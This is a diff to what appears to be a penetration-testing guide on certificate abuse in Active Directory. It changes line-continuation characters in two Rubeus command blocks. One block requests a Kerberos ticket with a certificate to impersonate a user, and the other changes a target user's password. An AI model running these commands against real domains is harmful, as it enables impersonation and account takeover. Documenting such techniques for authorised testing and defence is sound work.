@@ -59,12 +59,12 @@ The vulnerable cert will be added under the "Personal" folder that was initially
 Rubeus can be used to request a Kerberos ticket granting ticket using the certificate:
 
 ```powershell
-Rubeus.exe asktgt /user:$USER \
-                  /enctype:aes256 \
-                  /certificate:$CERTIFICATE_FILE \
-                  /password:$CERTIFICATE_FILE_PASSWORD \
-                  /outfile:$TICKET_FILE \
-                  /domain:$DOMAIN \
+Rubeus.exe asktgt /user:$USER `
+                  /enctype:aes256 `
+                  /certificate:$CERTIFICATE_FILE `
+                  /password:$CERTIFICATE_FILE_PASSWORD `
+                  /outfile:$TICKET_FILE `
+                  /domain:$DOMAIN `
                   /dc:$DC_IP_ADDRESS
 ```
 
@@ -73,9 +73,9 @@ Here we explode the UPN of the user we're going to impersonate between the `/use
 Change a user's password with Rubeus:
 
 ```powershell
-Rubeus.exe changepw /ticket:$TICKET_FILE \
-                    /new:$NEW_PASSWORD \
-                    /dc:$DC_IP_ADDRESS \
+Rubeus.exe changepw /ticket:$TICKET_FILE `
+                    /new:$NEW_PASSWORD `
+                    /dc:$DC_IP_ADDRESS `
                     /targetuser:$DOMAIN\$USER
 ```
 
